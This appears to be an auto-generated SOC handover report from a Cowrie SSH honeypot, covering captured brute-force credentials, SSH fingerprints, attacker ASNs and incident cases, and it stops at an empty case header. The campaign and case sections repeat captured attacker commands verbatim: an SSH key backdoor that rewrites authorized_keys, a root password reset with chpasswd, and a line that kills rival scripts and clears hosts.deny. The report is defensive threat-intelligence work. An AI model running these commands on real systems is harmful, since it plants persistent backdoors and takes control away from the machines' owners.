# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-13 |
| **Generated At** | 2026-05-13T14:43:51Z |
| **Shift Time** | 14:43 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **197** |
| Confirmed Threats | **175** |
| False Positives Filtered | **22** (11.2%) |
| Unique Attacker IPs | **56** |
| Countries of Origin | **24** |
| High Severity Cases | **30** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **167** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **55** |
| Unique Credential Pairs | **30** |
| Unique Usernames | **13** |
| Unique Passwords | **28** |
| Successful Auth Pairs | **29** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 30 |
| `345gs5662d34` | 13 |
| `admin` | 2 |
| `test1` | 1 |
| `kiran` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 13 |
| `3245gs5662d34` | 11 |
| `admin` | 3 |
| `1234` | 2 |
| `123` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 13 |
| `root` | `3245gs5662d34` | 11 |
| `admin` | `admin` | 2 |
| `root` | `123` | 2 |
| `root` | `hp@123` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Default123` | `57.128.182.5` | 2026-05-13T10:44:09 |
| `root` | `3245gs5662d34` | `57.128.182.5` | 2026-05-13T10:44:13 |
| `root` | `admin` | `27.79.42.144` | 2026-05-13T11:10:55 |
| `root` | `evv` | `189.244.42.190` | 2026-05-13T11:12:50 |
| `root` | `3245gs5662d34` | `189.244.42.190` | 2026-05-13T11:12:56 |
| `root` | `@` | `27.79.42.144` | 2026-05-13T11:13:44 |
| `root` | `-` | `103.134.154.138` | 2026-05-13T11:13:45 |
| `root` | `3245gs5662d34` | `103.134.154.138` | 2026-05-13T11:13:48 |
| `root` | `hotdog` | `181.116.220.140` | 2026-05-13T11:14:56 |
| `root` | `qq123456@` | `101.36.122.186` | 2026-05-13T11:42:20 |
| `root` | `3245gs5662d34` | `101.36.122.186` | 2026-05-13T11:42:23 |
| `root` | `123` | `35.200.126.118` | 2026-05-13T12:42:04 |
| `root` | `c9COIAoqR8` | `106.74.21.237` | 2026-05-13T12:53:04 |
| `root` | `o0o0o0o0` | `114.242.24.31` | 2026-05-13T12:59:15 |
| `root` | `victory1` | `61.240.156.16` | 2026-05-13T12:59:57 |
| `root` | `3245gs5662d34` | `61.240.156.16` | 2026-05-13T13:00:01 |
| `root` | `hp@123` | `101.36.119.184` | 2026-05-13T13:02:24 |
| `root` | `3245gs5662d34` | `101.36.119.184` | 2026-05-13T13:02:27 |
| `root` | `hp@123` | `80.253.31.232` | 2026-05-13T13:06:02 |
| `root` | `3245gs5662d34` | `80.253.31.232` | 2026-05-13T13:06:07 |
| `root` | `silvio` | `200.105.172.184` | 2026-05-13T13:06:39 |
| `root` | `3245gs5662d34` | `200.105.172.184` | 2026-05-13T13:06:46 |
| `root` | `trish` | `221.161.235.168` | 2026-05-13T13:07:41 |
| `root` | `3245gs5662d34` | `221.161.235.168` | 2026-05-13T13:07:44 |
| `root` | `ewp` | `14.103.118.198` | 2026-05-13T13:53:52 |
| `root` | `3245gs5662d34` | `14.103.118.198` | 2026-05-13T13:53:56 |
| `root` | `loveme` | `34.135.200.178` | 2026-05-13T13:56:04 |
| `root` | `3245gs5662d34` | `34.135.200.178` | 2026-05-13T13:56:09 |
| `root` | `P` | `213.195.112.227` | 2026-05-13T14:37:29 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **197** |
| Sessions with Fingerprint | **11** |
| Unique HASSH Fingerprints | **11** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 56 |
| AsyncSSH (Python) | 5 |
| Go SSH scanner | 3 |
| Unknown | 2 |
| Perl Net::SSH | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 24 | 7 |
| `03a80b21afa8...` | Modern SSH client | 16 | 8 |
| `af8223ac9914...` | libssh-based | 11 | 5 |
| `fda360b1b4f4...` | Mirai/variant | 5 | 2 |
| `19532158b559...` | Mirai/variant | 3 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 24 | 7 | Mirai/variant |
| `03a80b21afa8...` | libssh | 16 | 8 | Modern SSH client |
| `af8223ac9914...` | libssh | 11 | 5 | libssh-based |
| `fda360b1b4f4...` | AsyncSSH (Python) | 5 | 2 | Mirai/variant |
| `19532158b559...` | libssh | 3 | 1 | Mirai/variant |
| `1507069938cc...` | Go SSH scanner | 2 | 1 | Modern SSH client |
| `95420f9d932d...` | libssh | 2 | 2 | — |
| `dd9bcf093c35...` | Unknown | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **4** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1082, T1592` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 11 | 11 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:zQ9SBU5W5O2l"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `181.116.220.140`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:oASpcCgQ57yJ"|chpasswd|bash
```
Source IPs: `114.242.24.31`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `80.253.31.232`, `103.134.154.138`, `34.135.200.178`, `200.105.172.184`, `101.36.119.184`, `14.103.118.198`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **56** |
| Unique ASNs | **41** |
| High-Risk ASNs | **29** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4837` | CHINA UNICOM China169 Backbone | 4 | HIGH |
| `AS4134` | CHINANET BACKBONE | 3 | HIGH |
| `AS4811` | China Telecom (Group) | 3 | HIGH |
| `AS213412` | ONYPHE SAS | 3 | HIGH |
| `AS396982` | Google LLC | 3 | HIGH |
| `AS135377` | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | 2 | HIGH |
| `AS24835` | Vodafone Data | 2 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (30)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-1348c8cc65f9

| Field | Detail |
|---|---|
| **Source IP** | `57.128.182[.]5` |
| **First Seen** | 2026-05-13 10:44 |
| **Last Seen** | 2026-05-13 10:44 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 10:44:08` | `cowrie.session.connect` |
| `2026-05-13 10:44:08` | `cowrie.client.version` |
| `2026-05-13 10:44:09` | `cowrie.client.kex` |
| `2026-05-13 10:44:09` | `cowrie.login.success` |
| `2026-05-13 10:44:09` | `cowrie.session.params` |
| `2026-05-13 10:44:09` | `cowrie.command.input` |
| `2026-05-13 10:44:09` | `cowrie.command.failed` |
| `2026-05-13 10:44:10` | `cowrie.log.closed` |
| `2026-05-13 10:44:10` | `cowrie.session.params` |
| `2026-05-13 10:44:10` | `cowrie.command.input` |
| `2026-05-13 10:44:10` | `cowrie.session.file_download` |
| `2026-05-13 10:44:10` | `cowrie.log.closed` |
| `2026-05-13 10:44:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `57.128.182[.]5` to AbuseIPDB if not already reported
- [ ] Block `57.128.182[.]5` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-087e401eeade

| Field | Detail |
|---|---|
| **Source IP** | `57.128.182[.]5` |
| **First Seen** | 2026-05-13 10:44 |
| **Last Seen** | 2026-05-13 10:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 10:44:12` | `cowrie.session.connect` |
| `2026-05-13 10:44:12` | `cowrie.client.version` |
| `2026-05-13 10:44:13` | `cowrie.client.kex` |
| `2026-05-13 10:44:13` | `cowrie.login.success` |
| `2026-05-13 10:44:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `57.128.182[.]5` to AbuseIPDB if not already reported
- [ ] Block `57.128.182[.]5` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81ef3423f95a

| Field | Detail |
|---|---|
| **Source IP** | `27.79.42[.]144` |
| **First Seen** | 2026-05-13 11:10 |
| **Last Seen** | 2026-05-13 11:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 11:10:54` | `cowrie.session.connect` |
| `2026-05-13 11:10:54` | `cowrie.client.version` |
| `2026-05-13 11:10:54` | `cowrie.client.kex` |
| `2026-05-13 11:10:55` | `cowrie.login.success` |
| `2026-05-13 11:10:55` | `cowrie.direct-tcpip.request` |
| `2026-05-13 11:10:55` | `cowrie.direct-tcpip.ja4h` |
| `2026-05-13 11:10:55` | `cowrie.direct-tcpip.data` |
| `2026-05-13 11:10:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.79.42[.]144` to AbuseIPDB if not already reported
- [ ] Block `27.79.42[.]144` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eab79409954f

| Field | Detail |
|---|---|
| **Source IP** | `189.244.42[.]190` |
| **First Seen** | 2026-05-13 11:12 |
| **Last Seen** | 2026-05-13 11:12 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 11:12:49` | `cowrie.session.connect` |
| `2026-05-13 11:12:49` | `cowrie.client.version` |
| `2026-05-13 11:12:49` | `cowrie.client.kex` |
| `2026-05-13 11:12:50` | `cowrie.login.success` |
| `2026-05-13 11:12:51` | `cowrie.session.params` |
| `2026-05-13 11:12:51` | `cowrie.command.input` |
| `2026-05-13 11:12:51` | `cowrie.command.failed` |
| `2026-05-13 11:12:51` | `cowrie.log.closed` |
| `2026-05-13 11:12:51` | `cowrie.session.params` |
| `2026-05-13 11:12:51` | `cowrie.command.input` |
| `2026-05-13 11:12:52` | `cowrie.session.file_download` |
| `2026-05-13 11:12:52` | `cowrie.log.closed` |
| `2026-05-13 11:12:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.244.42[.]190` to AbuseIPDB if not already reported
- [ ] Block `189.244.42[.]190` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b7ce7621946

| Field | Detail |
|---|---|
| **Source IP** | `189.244.42[.]190` |
| **First Seen** | 2026-05-13 11:12 |
| **Last Seen** | 2026-05-13 11:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 11:12:55` | `cowrie.session.connect` |
| `2026-05-13 11:12:55` | `cowrie.client.version` |
| `2026-05-13 11:12:55` | `cowrie.client.kex` |
| `2026-05-13 11:12:56` | `cowrie.login.success` |
| `2026-05-13 11:12:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.244.42[.]190` to AbuseIPDB if not already reported
- [ ] Block `189.244.42[.]190` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38e39a2cbf66

| Field | Detail |
|---|---|
| **Source IP** | `27.79.42[.]144` |
| **First Seen** | 2026-05-13 11:13 |
| **Last Seen** | 2026-05-13 11:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 11:13:42` | `cowrie.session.connect` |
| `2026-05-13 11:13:42` | `cowrie.client.version` |
| `2026-05-13 11:13:43` | `cowrie.client.kex` |
| `2026-05-13 11:13:44` | `cowrie.login.success` |
| `2026-05-13 11:13:44` | `cowrie.direct-tcpip.request` |
| `2026-05-13 11:13:44` | `cowrie.direct-tcpip.ja4h` |
| `2026-05-13 11:13:44` | `cowrie.direct-tcpip.data` |
| `2026-05-13 11:13:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.79.42[.]144` to AbuseIPDB if not already reported
- [ ] Block `27.79.42[.]144` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ffec84deb219

| Field | Detail |
|---|---|
| **Source IP** | `103.134.154[.]138` |
| **First Seen** | 2026-05-13 11:13 |
| **Last Seen** | 2026-05-13 11:13 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 11:13:45` | `cowrie.session.connect` |
| `2026-05-13 11:13:45` | `cowrie.client.version` |
| `2026-05-13 11:13:45` | `cowrie.client.kex` |
| `2026-05-13 11:13:45` | `cowrie.login.success` |
| `2026-05-13 11:13:45` | `cowrie.session.params` |
| `2026-05-13 11:13:45` | `cowrie.command.input` |
| `2026-05-13 11:13:45` | `cowrie.command.failed` |
| `2026-05-13 11:13:45` | `cowrie.log.closed` |
| `2026-05-13 11:13:46` | `cowrie.session.params` |
| `2026-05-13 11:13:46` | `cowrie.command.input` |
| `2026-05-13 11:13:46` | `cowrie.session.file_download` |
| `2026-05-13 11:13:46` | `cowrie.log.closed` |
| `2026-05-13 11:13:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.134.154[.]138` to AbuseIPDB if not already reported
- [ ] Block `103.134.154[.]138` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3041548f6ed9

| Field | Detail |
|---|---|
| **Source IP** | `103.134.154[.]138` |
| **First Seen** | 2026-05-13 11:13 |
| **Last Seen** | 2026-05-13 11:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 11:13:47` | `cowrie.session.connect` |
| `2026-05-13 11:13:47` | `cowrie.client.version` |
| `2026-05-13 11:13:47` | `cowrie.client.kex` |
| `2026-05-13 11:13:48` | `cowrie.login.success` |
| `2026-05-13 11:13:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.134.154[.]138` to AbuseIPDB if not already reported
- [ ] Block `103.134.154[.]138` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bed3ed39fc5d

| Field | Detail |
|---|---|
| **Source IP** | `181.116.220[.]140` |
| **First Seen** | 2026-05-13 11:14 |
| **Last Seen** | 2026-05-13 11:15 |
| **Session Duration** | 59s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:zQ9SBU5W5O2l"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 11:14:52` | `cowrie.session.connect` |
| `2026-05-13 11:14:52` | `cowrie.client.version` |
| `2026-05-13 11:14:54` | `cowrie.client.kex` |
| `2026-05-13 11:14:56` | `cowrie.login.success` |
| `2026-05-13 11:14:57` | `cowrie.session.params` |
| `2026-05-13 11:14:57` | `cowrie.command.input` |
| `2026-05-13 11:14:57` | `cowrie.command.failed` |
| `2026-05-13 11:14:57` | `cowrie.log.closed` |
| `2026-05-13 11:14:58` | `cowrie.session.params` |
| `2026-05-13 11:14:58` | `cowrie.command.input` |
| `2026-05-13 11:14:58` | `cowrie.session.file_download` |
| `2026-05-13 11:14:58` | `cowrie.log.closed` |
| `2026-05-13 11:15:27` | `cowrie.session.params` |
| `2026-05-13 11:15:27` | `cowrie.command.input` |
| `2026-05-13 11:15:28` | `cowrie.log.closed` |
| `2026-05-13 11:15:30` | `cowrie.session.params` |
| `2026-05-13 11:15:30` | `cowrie.command.input` |
| `2026-05-13 11:15:30` | `cowrie.log.closed` |
| `2026-05-13 11:15:32` | `cowrie.session.params` |
| `2026-05-13 11:15:32` | `cowrie.command.input` |
| `2026-05-13 11:15:32` | `cowrie.session.file_download` |
| `2026-05-13 11:15:32` | `cowrie.log.closed` |
| `2026-05-13 11:15:33` | `cowrie.session.params` |
| `2026-05-13 11:15:33` | `cowrie.command.input` |
| `2026-05-13 11:15:33` | `cowrie.log.closed` |
| `2026-05-13 11:15:35` | `cowrie.session.params` |
| `2026-05-13 11:15:35` | `cowrie.command.input` |
| `2026-05-13 11:15:36` | `cowrie.log.closed` |
| `2026-05-13 11:15:37` | `cowrie.session.params` |
| `2026-05-13 11:15:37` | `cowrie.command.input` |
| `2026-05-13 11:15:37` | `cowrie.command.input` |
| `2026-05-13 11:15:38` | `cowrie.log.closed` |
| `2026-05-13 11:15:39` | `cowrie.session.params` |
| `2026-05-13 11:15:39` | `cowrie.command.input` |
| `2026-05-13 11:15:40` | `cowrie.log.closed` |
| `2026-05-13 11:15:40` | `cowrie.session.params` |
| `2026-05-13 11:15:40` | `cowrie.command.input` |
| `2026-05-13 11:15:41` | `cowrie.log.closed` |
| `2026-05-13 11:15:42` | `cowrie.session.params` |
| `2026-05-13 11:15:42` | `cowrie.command.input` |
| `2026-05-13 11:15:42` | `cowrie.log.closed` |
| `2026-05-13 11:15:43` | `cowrie.session.params` |
| `2026-05-13 11:15:43` | `cowrie.command.input` |
| `2026-05-13 11:15:44` | `cowrie.log.closed` |
| `2026-05-13 11:15:45` | `cowrie.session.params` |
| `2026-05-13 11:15:45` | `cowrie.command.input` |
| `2026-05-13 11:15:45` | `cowrie.log.closed` |
| `2026-05-13 11:15:47` | `cowrie.session.params` |
| `2026-05-13 11:15:47` | `cowrie.command.input` |
| `2026-05-13 11:15:47` | `cowrie.log.closed` |
| `2026-05-13 11:15:48` | `cowrie.session.params` |
| `2026-05-13 11:15:48` | `cowrie.command.input` |
| `2026-05-13 11:15:48` | `cowrie.log.closed` |
| `2026-05-13 11:15:49` | `cowrie.session.params` |
| `2026-05-13 11:15:49` | `cowrie.command.input` |
| `2026-05-13 11:15:49` | `cowrie.log.closed` |
| `2026-05-13 11:15:50` | `cowrie.session.params` |
| `2026-05-13 11:15:50` | `cowrie.command.input` |
| `2026-05-13 11:15:50` | `cowrie.log.closed` |
| `2026-05-13 11:15:51` | `cowrie.session.params` |
| `2026-05-13 11:15:51` | `cowrie.command.input` |
| `2026-05-13 11:15:51` | `cowrie.log.closed` |
| `2026-05-13 11:15:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.116.220[.]140` to AbuseIPDB if not already reported
- [ ] Block `181.116.220[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-301f784b568d

